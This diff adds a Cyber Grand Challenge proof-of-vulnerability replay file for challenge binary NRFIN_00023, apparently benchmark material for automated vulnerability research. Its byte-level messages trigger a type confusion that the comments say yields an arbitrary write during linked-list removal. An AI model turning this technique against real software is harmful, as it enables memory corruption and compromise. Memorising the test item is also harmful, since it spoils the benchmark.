@@ -1,0 +1,21 @@
+<?xml version="1.0" standalone="no" ?>
+<!DOCTYPE pov SYSTEM "/usr/share/cgc-docs/replay.dtd">
+<pov>
+    <!-- Type confusion -->
+    <cbid>NRFIN_00023</cbid>
+    <replay>
+        <!-- reliability -->
+        <delay>100</delay>
+
+        <!-- Add order with name which will hash to -1, adding stock to global orders list -->
+        <write><data>\x02\x00\x00\x00\xff\xff\xff\xff\x01\x00\x00\x00\x41\x41\x41\x41\x42\x42\x42\x42</data></write>
+        <read><length>4</length><match><data>\xa4\xff\xff\xb7</data></match></read>
+
+        <!-- Cancel the above stock as if it were an order, referencing the order as a stock.
+             Gives arbitrary write in link list removal -->
+        <write><data>\x04\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</data></write>
+
+        <!-- Terminate if patched -->
+        <write><data>\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</data></write>
+    </replay>
+</pov>
